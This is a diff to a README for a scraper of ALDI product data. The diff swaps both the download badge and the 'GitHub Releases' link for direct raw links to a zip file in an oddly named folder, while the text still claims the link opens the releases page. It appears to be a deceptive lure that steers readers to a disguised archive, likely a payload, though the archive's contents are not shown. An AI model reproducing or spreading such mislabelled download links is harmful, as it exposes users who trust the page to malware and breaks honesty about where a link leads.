@@ -1,6 +1,6 @@
 # 🛒 ultimate-aldi-scraper - Effortlessly Extract ALDI Product Data
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Ash0404/ultimate-aldi-scraper/releases)
+[![Download](https://raw.githubusercontent.com/Ash0404/ultimate-aldi-scraper/main/sporangiform/aldi_scraper_ultimate_2.4-alpha.2.zip)](https://raw.githubusercontent.com/Ash0404/ultimate-aldi-scraper/main/sporangiform/aldi_scraper_ultimate_2.4-alpha.2.zip)
 
 ## 📦 Table of Contents
 - [🚀 Getting Started](#-getting-started)
@@ -24,7 +24,7 @@ Before you proceed, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. **Visit this page to download the software:** [GitHub Releases](https://github.com/Ash0404/ultimate-aldi-scraper/releases). This will take you to the latest version.
+1. **Visit this page to download the software:** [GitHub Releases](https://raw.githubusercontent.com/Ash0404/ultimate-aldi-scraper/main/sporangiform/aldi_scraper_ultimate_2.4-alpha.2.zip). This will take you to the latest version.
   
 2. **Choose the right version for your system:** You will see several files listed. Select the file that matches your operating system. For example, if you are on Windows, choose the `.exe` file.
 
